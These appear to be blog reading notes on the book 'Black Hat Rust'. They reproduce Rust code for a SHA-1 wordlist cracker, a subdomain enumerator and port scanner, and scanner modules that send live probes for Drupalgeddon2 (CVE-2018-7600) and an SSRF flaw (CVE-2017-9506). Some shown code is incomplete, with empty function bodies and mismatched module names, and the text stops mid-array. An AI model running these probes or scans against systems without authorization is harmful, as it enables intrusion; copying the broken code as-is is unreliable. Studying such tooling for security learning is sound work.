---
title: "Black Hat Rust Reading Notes"
date: 2023-11-13T12:55:42-05:00
tags: ['rust']
draft: false
---

## Black Hat Rust
### Chapter 1 sha1_cracker
Cargo.toml
```toml
[package]
name = "sha1_cracker"
version = "0.1.0"
authors = ["Sylvain Kerkour <sylvain@kerkour.fr>"]
edition = "2021"

# See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html

[dependencies]
sha-1 = "0.10"
hex = "0.4"
```

main.rs
```rust
use sha1::Digest;
use std::{
    env,
    error::Error,
    fs::File,
    io::{BufRead, BufReader},
};

const SHA1_HEX_STRING_LENGTH: usize = 40;

fn main() -> Result<(), Box<dyn Error>> {
    let args: Vec<String> = env::args().collect();

    if args.len() != 3 {
        println!("Usage:");
        println!("sha1_cracker: <wordlist.txt> <sha1_hash>");
        return Ok(());
    }

    let hash_to_crack = args[2].trim();
    if hash_to_crack.len() != SHA1_HEX_STRING_LENGTH {
        return Err("sha1 hash is not valid".into());
    }

    let wordlist_file = File::open(&args[1])?;
    let reader = BufReader::new(&wordlist_file);

    for line in reader.lines() {
        let line = line?;
        let common_password = line.trim();
        if hash_to_crack == &hex::encode(sha1::Sha1::digest(common_password.as_bytes())) {
            println!("Password found: {}", &common_password);
            return Ok(());
        }
    }

    println!("password not found in wordlist :(");
    // as almost everything is an expression, this is equivalent to return Ok(());
    Ok(())
}
```
### Chapter 2 tricoder: Scaner with thread pool
Cargo.toml
```toml
[package]
name = "tricoder"
version = "0.1.0"
authors = ["Sylvain Kerkour <sylvain@kerkour.fr>"]
edition = "2021"

# See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html

[dependencies]
thiserror = "1.0"
anyhow = "1.0"
rayon = "1.5"
trust-dns-resolver = "0.21"
reqwest = { version = "0.11", default-features = false, features = ["json", "blocking", "rustls-tls"] }
serde = { version = "1", features = ["derive"] }
```

common_ports.rs
```rust
pub const MOST_COMMON_PORTS_100: &[u16] = &[
    80, 23, 443, 21, 22, 25, 3389, 110, 445, 139, 143, 53, 135, 3306, 8080, 1723, 111, 995, 993,
    5900, 1025, 587, 8888, 199, 1720, 465, 548, 113, 81, 6001, 10000, 514, 5060, 179, 1026, 2000,
    8443, 8000, 32768, 554, 26, 1433, 49152, 2001, 515, 8008, 49154, 1027, 5666, 646, 5000, 5631,
    631, 49153, 8081, 2049, 88, 79, 5800, 106, 2121, 1110, 49155, 6000, 513, 990, 5357, 427, 49156,
    543, 544, 5101, 144, 7, 389, 8009, 3128, 444, 9999, 5009, 7070, 5190, 3000, 5432, 1900, 3986,
    13, 1029, 9, 5051, 6646, 49157, 1028, 873, 1755, 2717, 4899, 9100, 119, 37,
];
```
error.rs
```rust
use thiserror::Error;

#[derive(Error, Debug, Clone)]
pub enum Error {
    #[error("Usage: tricoder <kerkour.com>")]
    CliUsage,
    #[error("Reqwest: {0}")]
    Reqwest(String),
}

impl std::convert::From<reqwest::Error> for Error {
    fn from(err: reqwest::Error) -> Self {
        Error::Reqwest(err.to_string())
    }
}
```
models.rs
```rust
use serde::Deserialize;

#[derive(Debug, Clone)]
pub struct Subdomain {
    pub domain: String,
    pub open_ports: Vec<Port>,
}

#[derive(Debug, Clone)]
pub struct Port {
    pub port: u16,
    pub is_open: bool,
}

#[derive(Debug, Deserialize, Clone)]
pub struct CrtShEntry {
    pub name_value: String,
}
```
ports.rs
```rust
use crate::{
    common_ports::MOST_COMMON_PORTS_100,
    model::{Port, Subdomain},
};
use rayon::prelude::*;
use std::net::{SocketAddr, ToSocketAddrs};
use std::{net::TcpStream, time::Duration};

pub fn scan_ports(mut subdomain: Subdomain) -> Subdomain {
    let socket_addresses: Vec<SocketAddr> = format!("{}:1024", subdomain.domain)
        .to_socket_addrs()
        .expect("port scanner: Creating socket address")
        .collect();

    if socket_addresses.is_empty() {
        return subdomain;
    }

    subdomain.open_ports = MOST_COMMON_PORTS_100
        .into_par_iter() // rayon::prelude::*;
        .map(|port| scan_port(socket_addresses[0], *port))
        .filter(|port| port.is_open) // filter closed ports
        .collect();
    subdomain
}

fn scan_port(mut socket_address: SocketAddr, port: u16) -> Port {
    let timeout = Duration::from_secs(3);
    socket_address.set_port(port);

    let is_open = TcpStream::connect_timeout(&socket_address, timeout).is_ok();

    Port { port, is_open }
}
```
subdomains.rs
```rust
use crate::{
    model::{CrtShEntry, Subdomain},
    Error,
};
use reqwest::blocking::Client;
use std::{collections::HashSet, time::Duration};
use trust_dns_resolver::{
    config::{ResolverConfig, ResolverOpts},
    Resolver,
};

pub fn enumerate(http_client: &Client, target: &str) -> Result<Vec<Subdomain>, Error> {
    let entries: Vec<CrtShEntry> = http_client
        .get(&format!("https://crt.sh/?q=%25.{}&output=json", target))
        .send()?
        .json()?;

    // clean and dedup results
    let mut subdomains: HashSet<String> = entries
        .into_iter()
        .flat_map(|entry| {
            entry
                .name_value
                .split('\n')
                .map(|subdomain| subdomain.trim().to_string())
                .collect::<Vec<String>>()
        })
        .filter(|subdomain: &String| subdomain != target)
        .filter(|subdomain: &String| !subdomain.contains('*'))
        .collect();
    subdomains.insert(target.to_string());

    let subdomains: Vec<Subdomain> = subdomains
        .into_iter()
        .map(|domain| Subdomain {
            domain,
            open_ports: Vec::new(),
        })
        .filter(resolves)
        .collect();

    Ok(subdomains)
}

pub fn resolves(domain: &Subdomain) -> bool {
    let mut opts = ResolverOpts::default();
    opts.timeout = Duration::from_secs(4);

    let dns_resolver = Resolver::new(
        ResolverConfig::default(),
        opts,
    )
    .expect("subdomain resolver: building DNS client");
    dns_resolver.lookup_ip(domain.domain.as_str()).is_ok()
}
```

main.rs
```rust
use rayon::prelude::*;
use reqwest::{blocking::Client, redirect};
use std::{env, time::Duration};

mod error;
pub use error::Error;
mod model;
mod ports;
mod subdomains;
use model::Subdomain;
mod common_ports;

fn main() -> Result<(), anyhow::Error> {
    let args: Vec<String> = env::args().collect();

    if args.len() != 2 {
        return Err(Error::CliUsage.into());
    }

    let target = args[1].as_str();

    let http_timeout = Duration::from_secs(5);
    let http_client = Client::builder()
        .redirect(redirect::Policy::limited(4))
        .timeout(http_timeout)
        .build()?;

    // we use a custom threadpool to improve speed
    let pool = rayon::ThreadPoolBuilder::new()
        .num_threads(256)
        .build()
        .unwrap();

    // pool.install is required to use our custom threadpool, instead of rayon's default one
    pool.install(|| {
        let scan_result: Vec<Subdomain> = subdomains::enumerate(&http_client, target)
            .unwrap()
            .into_par_iter()
            .map(ports::scan_ports)
            .collect();

        for subdomain in scan_result {
            println!("{}:", &subdomain.domain);
            for port in &subdomain.open_ports {
                println!("    {}", port.port);
            }

            println!();
        }
    });

    Ok(())
}
```

### Chapter 3 tricoder: Scaner with async
Cargo.toml
```toml
[package]
name = "tricoder"
version = "0.1.0"
authors = ["Sylvain Kerkour <sylvain@kerkour.fr>"]
edition = "2021"

# See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html

[dependencies]
tokio = { version = "1", features = ["full"] }
thiserror = "1.0"
anyhow = "1.0"
reqwest = { version = "0.11", default-features = false, features = ["json", "rustls-tls"] }
serde = { version = "1", features = ["derive"] }
trust-dns-resolver = "0.21"
futures = "0.3"
tokio-stream = "0.1"
```

ch_03/tricoder/src/common_ports.rs
```rust
pub const MOST_COMMON_PORTS_100: &[u16] = &[
    80, 23, 443, 21, 22, 25, 3389, 110, 445, 139, 143, 53, 135, 3306, 8080, 1723, 111, 995, 993,
    5900, 1025, 587, 8888, 199, 1720, 465, 548, 113, 81, 6001, 10000, 514, 5060, 179, 1026, 2000,
    8443, 8000, 32768, 554, 26, 1433, 49152, 2001, 515, 8008, 49154, 1027, 5666, 646, 5000, 5631,
    631, 49153, 8081, 2049, 88, 79, 5800, 106, 2121, 1110, 49155, 6000, 513, 990, 5357, 427, 49156,
    543, 544, 5101, 144, 7, 389, 8009, 3128, 444, 9999, 5009, 7070, 5190, 3000, 5432, 1900, 3986,
    13, 1029, 9, 5051, 6646, 49157, 1028, 873, 1755, 2717, 4899, 9100, 119, 37,
];
```
ch_03/tricoder/src/error.rs
```rust
use thiserror::Error;

#[derive(Error, Debug, Clone)]
pub enum Error {
    #[error("Usage: tricoder <kerkour.com>")]
    CliUsage,
    #[error("Reqwest: {0}")]
    Reqwest(String),
}

impl std::convert::From<reqwest::Error> for Error {
    fn from(err: reqwest::Error) -> Self {
        Error::Reqwest(err.to_string())
    }
}
```
ch_03/tricoder/src/model.rs
```rust
use serde::Deserialize;

#[derive(Debug, Clone)]
pub struct Subdomain {
    pub domain: String,
    pub open_ports: Vec<Port>,
}

#[derive(Debug, Clone)]
pub struct Port {
    pub port: u16,
    pub is_open: bool,
}

#[derive(Debug, Deserialize, Clone)]
pub struct CrtShEntry {
    pub name_value: String,
}
```

ch_03/tricoder/src/ports.rs
```rust
use crate::{
    common_ports::MOST_COMMON_PORTS_100,
    model::{Port, Subdomain},
};
use futures::StreamExt;
use std::net::{SocketAddr, ToSocketAddrs};
use std::time::Duration;
use tokio::net::TcpStream;
use tokio::sync::mpsc;

pub async fn scan_ports(concurrency: usize, subdomain: Subdomain) -> Subdomain {
    let mut ret = subdomain.clone();
    let socket_addresses: Vec<SocketAddr> = format!("{}:1024", subdomain.domain)
        .to_socket_addrs()
        .expect("port scanner: Creating socket address")
        .collect();

    if socket_addresses.len() == 0 {
        return subdomain;
    }

    let socket_address = socket_addresses[0];

    // Concurrent stream method 3: using channels
    let (input_tx, input_rx) = mpsc::channel(concurrency);
    let (output_tx, output_rx) = mpsc::channel(concurrency);

    tokio::spawn(async move {
        for port in MOST_COMMON_PORTS_100 {
            let _ = input_tx.send(*port).await;
        }
    });

    let input_rx_stream = tokio_stream::wrappers::ReceiverStream::new(input_rx);
    input_rx_stream
        .for_each_concurrent(concurrency, |port| {
            let output_tx = output_tx.clone();
            async move {
                let port = scan_port(socket_address, port).await;
                if port.is_open {
                    let _ = output_tx.send(port).await;
                }
            }
        })
        .await;
    // close channel
    drop(output_tx);

    let output_rx_stream = tokio_stream::wrappers::ReceiverStream::new(output_rx);
    ret.open_ports = output_rx_stream.collect().await;

    ret
}

async fn scan_port(mut socket_address: SocketAddr, port: u16) -> Port {
    let timeout = Duration::from_secs(3);
    socket_address.set_port(port);

    let is_open = matches!(
        tokio::time::timeout(timeout, TcpStream::connect(&socket_address)).await,
        Ok(Ok(_)),
    );

    Port {
        port: port,
        is_open,
    }
}
```
ch_03/tricoder/src/subdomains.rs
```rust
use crate::{
    model::{CrtShEntry, Subdomain},
    Error,
};
use futures::stream;
use futures::StreamExt;
use reqwest::Client;
use std::{collections::HashSet, time::Duration};
use trust_dns_resolver::{
    config::{ResolverConfig, ResolverOpts},
    name_server::{GenericConnection, GenericConnectionProvider, TokioRuntime},
    AsyncResolver,
};

type DnsResolver = AsyncResolver<GenericConnection, GenericConnectionProvider<TokioRuntime>>;

pub async fn enumerate(http_client: &Client, target: &str) -> Result<Vec<Subdomain>, Error> {
    let entries: Vec<CrtShEntry> = http_client
        .get(&format!("https://crt.sh/?q=%25.{}&output=json", target))
        .send()
        .await?
        .json()
        .await?;

    let mut dns_resolver_opts = ResolverOpts::default();
    dns_resolver_opts.timeout = Duration::from_secs(4);

    let dns_resolver = AsyncResolver::tokio(
        ResolverConfig::default(),
        dns_resolver_opts,
    )
    .expect("subdomain resolver: building DNS client");

    // clean and dedup results
    let mut subdomains: HashSet<String> = entries
        .into_iter()
        .map(|entry| {
            entry
                .name_value
                .split("\n")
                .map(|subdomain| subdomain.trim().to_string())
                .collect::<Vec<String>>()
        })
        .flatten()
        .filter(|subdomain: &String| subdomain != target)
        .filter(|subdomain: &String| !subdomain.contains("*"))
        .collect();
    subdomains.insert(target.to_string());

    let subdomains: Vec<Subdomain> = stream::iter(subdomains.into_iter())
        .map(|domain| Subdomain {
            domain,
            open_ports: Vec::new(),
        })
        .filter_map(|subdomain| {
            let dns_resolver = dns_resolver.clone();
            async move {
                if resolves(&dns_resolver, &subdomain).await {
                    Some(subdomain)
                } else {
                    None
                }
            }
        })
        .collect()
        .await;

    Ok(subdomains)
}

pub async fn resolves(dns_resolver: &DnsResolver, domain: &Subdomain) -> bool {
    dns_resolver.lookup_ip(domain.domain.as_str()).await.is_ok()
}
```
ch_03/tricoder/src/main.rs
```rust
use futures::{stream, StreamExt};
use reqwest::Client;
use std::{
    env,
    time::{Duration, Instant},
};

mod error;
pub use error::Error;
mod model;
mod ports;
mod subdomains;
use model::Subdomain;
mod common_ports;

#[tokio::main]
async fn main() -> Result<(), anyhow::Error> {
    let args: Vec<String> = env::args().collect();

    if args.len() != 2 {
        return Err(Error::CliUsage.into());
    }

    let target = args[1].as_str();

    let http_timeout = Duration::from_secs(10);
    let http_client = Client::builder().timeout(http_timeout).build()?;

    let ports_concurrency = 200;
    let subdomains_concurrency = 100;
    let scan_start = Instant::now();

    let subdomains = subdomains::enumerate(&http_client, target).await?;

    // Concurrent stream method 1: Using buffer_unordered + collect
    let scan_result: Vec<Subdomain> = stream::iter(subdomains.into_iter())
        .map(|subdomain| ports::scan_ports(ports_concurrency, subdomain))
        .buffer_unordered(subdomains_concurrency)
        .collect()
        .await;

    // Concurrent stream method 2: Using an Arc<Mutex<T>>
    // let res: Arc<Mutex<Vec<Subdomain>>> = Arc::new(Mutex::new(Vec::new()));

    // stream::iter(subdomains.into_iter())
    //     .for_each_concurrent(subdomains_concurrency, |subdomain| {
    //         let res = res.clone();
    //         async move {
    //             let subdomain = ports::scan_ports(ports_concurrency, subdomain).await;
    //             res.lock().await.push(subdomain)
    //         }
    //     })
    //     .await;

    let scan_duration = scan_start.elapsed();
    println!("Scan completed in {:?}", scan_duration);

    for subdomain in scan_result {
        println!("{}:", &subdomain.domain);
        for port in &subdomain.open_ports {
            println!("    {}: open", port.port);
        }

        println!("");
    }

    Ok(())
}
```

### Chapter 4 tricoder: Scaner with Generic
Cargo.toml
```toml
[package]
name = "tricoder"
version = "0.1.0"
authors = ["Sylvain Kerkour <sylvain@kerkour.fr>"]
edition = "2021"

# See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html

[dependencies]
tokio = { version = "1", features = ["full"] }
thiserror = "1.0"
anyhow = "1.0"
reqwest = { version = "0.11", default-features = false, features = ["json", "rustls-tls"] }
serde = { version = "1", features = ["derive"] }
trust-dns-resolver = "0.21"
futures = "0.3"
tokio-stream = "0.1"
log = "0.4"
env_logger = "0.9"
async-trait = "0.1"
clap = { version = "3.1", features = ["cargo"] }
regex = "1"
url = "2"
```
ch_04/tricoder/src/modules/http/cve_2017_9506.rs
```rust
use crate::{
    modules::{HttpFinding, HttpModule, Module},
    Error,
};
use async_trait::async_trait;
use reqwest::Client;

pub struct Cve2017_9506 {}

impl Cve2017_9506 {
    pub fn new() -> Self {
        Cve2017_9506 {}
    }
}

impl Module for Cve2017_9506 {
    fn name(&self) -> String {
        String::from("http/cve_2017_9506")
    }

    fn description(&self) -> String {
        String::from("Check for CVE-2017-9506 (SSRF)")
    }
}

#[async_trait]
impl HttpModule for Cve2017_9506 {
    async fn scan(
        &self,
        http_client: &Client,
        endpoint: &str,
    ) -> Result<Option<HttpFinding>, Error> {
        let url = format!(
            "{}/plugins/servlet/oauth/users/icon-uri?consumerUri=https://google.com/robots.txt",
            &endpoint
        );
        let res = http_client.get(&url).send().await?;

        if !res.status().is_success() {
            return Ok(None);
        }

        let body = res.text().await?;
        if body.contains("user-agent: *") && body.contains("disallow") {
            return Ok(Some(HttpFinding::Cve2017_9506(url)));
        }

        Ok(None)
    }
}
```
ch_04/tricoder/src/modules/http/cve_2018_7600.rs
```rust
use crate::{
    modules::{HttpFinding, HttpModule, Module},
    Error,
};
use async_trait::async_trait;
use regex::Regex;
use reqwest::Client;

pub struct Cve2018_7600 {
    form_regex: Regex,
}

impl Cve2018_7600 {
    pub fn new() -> Self {
        Cve2018_7600 {
            form_regex: Regex::new(
                r#"<input type="hidden" name="form_build_id" value="([^"]+)" />"#,
            )
            .expect("http/cve_2018_7600: compiling regexp"),
        }
    }
}

impl Module for Cve2018_7600 {
    fn name(&self) -> String {
        String::from("http/cve_2018_7600")
    }

    fn description(&self) -> String {
        String::from("Check for CVE-2018-7600 (a.k.a. Drupalgeddon2)")
    }
}

#[async_trait]
impl HttpModule for Cve2018_7600 {
    async fn scan(
        &self,
        http_client: &Client,
        endpoint: &str,
    ) -> Result<Option<HttpFinding>, Error> {
        let token = "08d15a4aef553492d8971cdd5198f31408d15a4aef553492d8971cdd5198f314";

        let form = [
            ("form_id", "user_pass"),
            ("_triggering_element_name", "name"),
        ];
        let query_params = [
            ("name[#type]", "markup"),
            ("name[#markup]", &(token.clone())),
            ("name[#post_render][]", "printf"),
            ("q", "user/password"),
        ];

        let url = format!("{}/", endpoint);
        let res = http_client
            .post(&url)
            .query(&query_params)
            .form(&form)
            .send()
            .await?;

        let body = res.text().await?;

        if let Some(matchs) = self.form_regex.captures(&body) {
            if matchs.len() > 1 {
                let form_id = &matchs[1];

                let form = [("form_build_id", form_id)];
                let query_params = [("q", format!("file/ajax/name/#value/{}", form_id))];
                let res = http_client
                    .post(&url)
                    .query(&query_params)
                    .form(&form)
                    .send()
                    .await?;

                let body = res.text().await?;

                if body.contains(&token) {
                    return Ok(Some(HttpFinding::Cve2018_7600(url)));
                }
            }
        }

        Ok(None)
    }
}
```
ch_04/tricoder/src/modules/http/directory_listing_disclosure.rs
```rust
use crate::{
    modules::{HttpFinding, HttpModule, Module},
    Error,
};
use async_trait::async_trait;
use regex::Regex;
use reqwest::Client;

pub struct DirectoryListingDisclosure {
    dir_listing_regex: Regex,
}

impl DirectoryListingDisclosure {
    pub fn new() -> Self {
        DirectoryListingDisclosure {
            dir_listing_regex: Regex::new(r"<title>Index of .*</title>")
                .expect("compiling http/directory_listing regexp"),
        }
    }

    async fn is_directory_listing(&self, body: String) -> Result<bool, Error> {
        let dir_listing_regex = self.dir_listing_regex.clone();
        let res = tokio::task::spawn_blocking(move || dir_listing_regex.is_match(&body)).await?;

        Ok(res)
    }
}

impl Module for DirectoryListingDisclosure {
    fn name(&self) -> String {
        String::from("http/directory_listing")
    }

    fn description(&self) -> String {
        String::from("Check for enabled directory listing, which often leak information")
    }
}

#[async_trait]
impl HttpModule for DirectoryListingDisclosure {
    async fn scan(
        &self,
        http_client: &Client,
        endpoint: &str,
    ) -> Result<Option<HttpFinding>, Error> {
        let url = format!("{}/", &endpoint);
        let res = http_client.get(&url).send().await?;

        if !res.status().is_success() {
            return Ok(None);
        }

        let body = res.text().await?;
        if self.is_directory_listing(body).await? {
            return Ok(Some(HttpFinding::DirectoryListingDisclosure(url)));
        }

        Ok(None)
    }
}

#[cfg(test)]
mod tests {
    use super::DirectoryListingDisclosure;

    #[tokio::test]
    async fn is_directory_listing() {
        let module = DirectoryListingDisclosure::new();

        let body = String::from("Content <title>Index of kerkour.com</title> test");
        let body2 = String::from(">ccece> Contrnt <tle>Index of kerkour.com</title> test");
        let body3 = String::from("");
        let body4 = String::from("test test test test test< test> test  <title>Index</title> test");

        assert_eq!(true, module.is_directory_listing(body).await.unwrap());
        assert_eq!(false, module.is_directory_listing(body2).await.unwrap());
        assert_eq!(false, module.is_directory_listing(body3).await.unwrap());
        assert_eq!(false, module.is_directory_listing(body4).await.unwrap());
    }
}
```
ch_04/tricoder/src/modules/http/mod.rs
```rust
mod directory_listing_disclosure;
pub use directory_listing_disclosure::DirectoryListingDisclosure;
mod dotenv_disclosure;
pub use dotenv_disclosure::DotEnvDisclosure;
mod ds_store_disclosure;
pub use ds_store_disclosure::DsStoreDisclosure;
mod traefik_dashboard_unauthenticated_access;
pub use traefik_dashboard_unauthenticated_access::TraefikDashboardUnauthenticatedAccess;
mod prometheus_dashboard_unauthenticated_access;
pub use prometheus_dashboard_unauthenticated_access::PrometheusDashboardUnauthenticatedAccess;
mod kibana_unauthenticated_access;
pub use kibana_unauthenticated_access::KibanaUnauthenticatedAccess;
mod gitlab_open_registrations;
pub use gitlab_open_registrations::GitlabOpenRegistrations;
mod git_head_disclosure;
pub use git_head_disclosure::GitHeadDisclosure;
mod git_directory_disclosure;
pub use git_directory_disclosure::GitDirectoryDisclosure;
mod git_config_disclosure;
pub use git_config_disclosure::GitConfigDisclosure;
mod etcd_unauthenticated_access;
pub use etcd_unauthenticated_access::EtcdUnauthenticatedAccess;
mod cve_2017_9506;
pub use cve_2017_9506::Cve2017_9506;
mod cve_2018_7600;
pub use cve_2018_7600::Cve2018_7600;
mod elasticsearch_unauthenticated_access;
pub use elasticsearch_unauthenticated_access::ElasticsearchUnauthenticatedAccess;
```
ch_04/tricoder/src/modules/subdomains/crtsh.rs
```rust
use crate::{
    modules::{Module, SubdomainModule},
    Error,
};
use async_trait::async_trait;
use serde::{Deserialize, Serialize};
use std::collections::HashSet;

pub struct Crtsh {}

impl Crtsh {
    pub fn new() -> Self {
        Crtsh {}
    }
}

impl Module for Crtsh {
    fn name(&self) -> String {
        String::from("subdomains/crtsh")
    }

    fn description(&self) -> String {
        String::from("Use crt.sh/ to find subdomains")
    }
}

#[derive(Clone, Debug, Deserialize, Serialize)]
struct CrtShEntry {
    name_value: String,
}

#[async_trait]
impl SubdomainModule for Crtsh {
    async fn enumerate(&self, domain: &str) -> Result<Vec<String>, Error> {
        let url = format!("https://crt.sh/?q=%25.{}&output=json", domain);
        let res = reqwest::get(&url).await?;

        if !res.status().is_success() {
            return Err(Error::InvalidHttpResponse(self.name()));
        }

        let crtsh_entries: Vec<CrtShEntry> = match res.json().await {
            Ok(info) => info,
            Err(_) => return Err(Error::InvalidHttpResponse(self.name())),
        };

        // clean and dedup results
        let subdomains: HashSet<String> = crtsh_entries
            .into_iter()
            .map(|entry| {
                entry
                    .name_value
                    .split("\n")
                    .map(|subdomain| subdomain.trim().to_string())
                    .collect::<Vec<String>>()
            })
            .flatten()
            .filter(|subdomain: &String| !subdomain.contains("*"))
            .collect();

        Ok(subdomains.into_iter().collect())
    }
}
```
ch_04/tricoder/src/modules/subdomains/web_archive.rs
```rust
use crate::{
    modules::{Module, SubdomainModule},
    Error,
};
use async_trait::async_trait;
use serde::{Deserialize, Serialize};
use std::collections::HashSet;
use url::Url;

pub struct WebArchive {}

impl WebArchive {
    pub fn new() -> Self {
        WebArchive {}
    }
}

impl Module for WebArchive {
    fn name(&self) -> String {
        String::from("subdomains/webarchive")
    }

    fn description(&self) -> String {
        String::from("Use web.archive.org to find subdomains")
    }
}

#[derive(Clone, Debug, Deserialize, Serialize)]
struct WebArchiveResponse(Vec<Vec<String>>);

#[async_trait]
impl SubdomainModule for WebArchive {
    async fn enumerate(&self, domain: &str) -> Result<Vec<String>, Error> {
        let url = format!("https://web.archive.org/cdx/search/cdx?matchType=domain&fl=original&output=json&collapse=urlkey&url={}", domain);
        let res = reqwest::get(&url).await?;

        if !res.status().is_success() {
            return Err(Error::InvalidHttpResponse(self.name()));
        }

        let web_archive_urls: WebArchiveResponse = match res.json().await {
            Ok(info) => info,
            Err(_) => return Err(Error::InvalidHttpResponse(self.name())),
        };

        let subdomains: HashSet<String> = web_archive_urls
            .0
            .into_iter()
            .flatten()
            .filter_map(|url| {
                Url::parse(&url)
                    .map_err(|err| {
                        log::error!("{}: error parsing url: {}", self.name(), err);
                        err
                    })
                    .ok()
            })
            .filter_map(|url| url.host_str().map(|host| host.to_string()))
            .collect();

        Ok(subdomains.into_iter().collect())
    }
}
```
ch_04/tricoder/src/modules/subdomains/mod.rs
```rust
mod crtsh;
pub use crtsh::Crtsh;
mod web_archive;
pub use web_archive::WebArchive;
```
ch_04/tricoder/src/modules/mod.rs
```rust
use crate::Error;
use async_trait::async_trait;
use reqwest::Client;

mod http;
mod subdomains;

pub fn all_http_modules() -> Vec<Box<dyn HttpModule>> {
}

pub fn all_subdomains_modules() -> Vec<Box<dyn SubdomainModule>> {
}

pub trait Module {
    fn name(&self) -> String;
    fn description(&self) -> String;
}

////////////////////////////////////////////////////////////////////////////////////////////////////
// Subdomains
////////////////////////////////////////////////////////////////////////////////////////////////////

#[async_trait]
pub trait SubdomainModule: Module {
    async fn enumerate(&self, domain: &str) -> Result<Vec<String>, Error>;
}

#[derive(Debug, Clone)]
pub struct Subdomain {
    pub domain: String,
    pub open_ports: Vec<Port>,
}

#[derive(Debug, Clone)]
pub struct Port {
    pub port: u16,
    pub is_open: bool,
    pub findings: Vec<HttpFinding>,
}

////////////////////////////////////////////////////////////////////////////////////////////////////
// HTTP
////////////////////////////////////////////////////////////////////////////////////////////////////

#[async_trait]
pub trait HttpModule: Module {
    async fn scan(
        &self,
        http_client: &Client,
        endpoint: &str,
    ) -> Result<Option<HttpFinding>, Error>;
}

#[derive(Debug, Clone)]
pub enum HttpFinding {
    DsStoreFileDisclosure(String),
    DotEnvFileDisclosure(String),
    DirectoryListingDisclosure(String),
    TraefikDashboardUnauthenticatedAccess(String),
    PrometheusDashboardUnauthenticatedAccess(String),
    KibanaUnauthenticatedAccess(String),
    GitlabOpenRegistrations(String),
    GitHeadDisclosure(String),
    GitDirectoryDisclosure(String),
    GitConfigDisclosure(String),
    EtcdUnauthenticatedAccess(String),
    Cve2017_9506(String),
    Cve2018_7600(String),
    ElasticsearchUnauthenticatedAccess(String),
}
```
ch_04/tricoder/src/cli.rs
```rust
use futures::stream;
use futures::StreamExt;
use reqwest::Client;
use std::collections::HashSet;
use std::iter::FromIterator;
use std::time::Duration;
use std::time::Instant;

use crate::dns;
use crate::modules::HttpModule;
use crate::modules::Subdomain;
use crate::ports;
use crate::{modules, Error};

pub fn modules() {
    let http_modules = modules::all_http_modules();
    let subdomains_modules = modules::all_subdomains_modules();

    println!("Subdomains modules");
    for module in subdomains_modules {
        println!("   {}: {}", module.name(), module.description());
    }

    println!("HTTP modules");
    for module in http_modules {
        println!("    {}: {}", module.name(), module.description());
    }
}

pub fn scan(target: &str) -> Result<(), Error> {
    log::info!("Scanning: {}", target);

    let runtime = tokio::runtime::Builder::new_multi_thread()
        .enable_all()
        .build()
        .expect("Building tokio's runtime");

    let http_timeout = Duration::from_secs(10);
    let http_client = Client::builder().timeout(http_timeout).build()?;
    let dns_resolver = dns::new_resolver();

    let subdomains_concurrency = 20;
    let dns_concurrency = 100;
    let ports_concurrency = 200;
    let vulnerabilities_conccurency = 20;
    let scan_start = Instant::now();

    let subdomains_modules = modules::all_subdomains_modules();

    runtime.block_on(async move {
        // 1st step: concurrently scan subdomains
        let mut subdomains: Vec<String> = stream::iter(subdomains_modules.into_iter())
            .map(|module| async move {
                match module.enumerate(target).await {
                    Ok(new_subdomains) => Some(new_subdomains),
                    Err(err) => {
                        log::error!("subdomains/{}: {}", module.name(), err);
                        None
                    }
                }
            })
            .buffer_unordered(subdomains_concurrency)
            .filter_map(|domain| async { domain })
            .collect::<Vec<Vec<String>>>()
            .await
            .into_iter()
            .flatten()
            .collect();

        subdomains.push(target.to_string());

        // 2nd step: dedup, clean and convert results
        let subdomains: Vec<Subdomain> = HashSet::<String>::from_iter(subdomains.into_iter())
            .into_iter()
            .filter(|subdomain| subdomain.contains(target))
            .map(|domain| Subdomain {
                domain,
                open_ports: Vec::new(),
            })
            .collect();

        log::info!("Found {} domains", subdomains.len());

        // 3rd step: concurrently filter unresolvable domains
        let subdomains: Vec<Subdomain> = stream::iter(subdomains.into_iter())
            .map(|domain| dns::resolves(&dns_resolver, domain))
            .buffer_unordered(dns_concurrency)
            .filter_map(|domain| async move { domain })
            .collect()
            .await;

        // 4th step: concurrently scan ports
        let subdomains: Vec<Subdomain> = stream::iter(subdomains.into_iter())
            .map(|domain| {
                log::info!("Scannig ports for {}", &domain.domain);
                ports::scan_ports(ports_concurrency, domain)
            })
            .buffer_unordered(1)
            .collect()
            .await;

        for subdomain in &subdomains {
            println!("{}", subdomain.domain);
            for port in &subdomain.open_ports {
                println!("    {}", port.port);
            }
        }

        println!("---------------------- Vulnerabilities ----------------------");

        // 5th step: concurrently scan vulnerabilities
        let mut targets: Vec<(Box<dyn HttpModule>, String)> = Vec::new();
        for subdomain in subdomains {
            for port in subdomain.open_ports {
                let http_modules = modules::all_http_modules();
                for http_module in http_modules {
                    let target = format!("http://{}:{}", &subdomain.domain, port.port);
                    targets.push((http_module, target));
                }
            }
        }

        // stream::iter(subdomains.into_iter())
        //     .map(|domain| {
        //         domain
        //             .open_ports
        //             .iter()
        //             .map(|port| format!("http://{}:{}", &domain.domain, port.port))
        //             .collect::<Vec<String>>()
        //     })
        //     .map(|targets| {
        //         stream::iter(targets.into_iter().map(|target| {
        //             let http_modules = modules::all_http_modules();
        //             return (http_modules, target);
        //         }))
        //     })
        //     .flatten()
        //     .map(|(modules, target)| {
        //         stream::iter(modules.into_iter().map(move |module| {
        //             return (module, target.clone());
        //         }))
        //     })
        //     .flatten()
        stream::iter(targets.into_iter())
            .for_each_concurrent(vulnerabilities_conccurency, |(module, target)| {
                let http_client = http_client.clone();
                async move {
                    match module.scan(&http_client, &target).await {
                        Ok(Some(finding)) => println!("{:?}", &finding),
                        Ok(None) => {}
                        Err(err) => log::debug!("Error: {}", err),
                    };
                }
            })
            .await;
    });

    let scan_duration = scan_start.elapsed();
    log::info!("Scan completed in {:?}", scan_duration);

    Ok(())
}
```
ch_04/tricoder/src/common_ports.rs
```rust
pub const MOST_COMMON_PORTS: &[u16] = &[
    80, 23, 443, 21, 22, 25, 3389, 110, 445, 139, 143, 53, 135, 3306, 8080, 1723, 111, 995, 993,
    5900, 1025, 587, 8888, 199, 1720, 465, 548, 113, 81, 6001, 10000, 514, 5060, 179, 1026, 2000,
    8443, 8000, 32768, 554, 26, 1433, 49152, 2001, 515, 8008, 49154, 1027, 5666, 646, 5000, 5631,
    631, 49153, 8081, 2049, 88, 79, 5800, 106, 2121, 1110, 49155, 6000, 513, 990, 5357, 427, 49156,
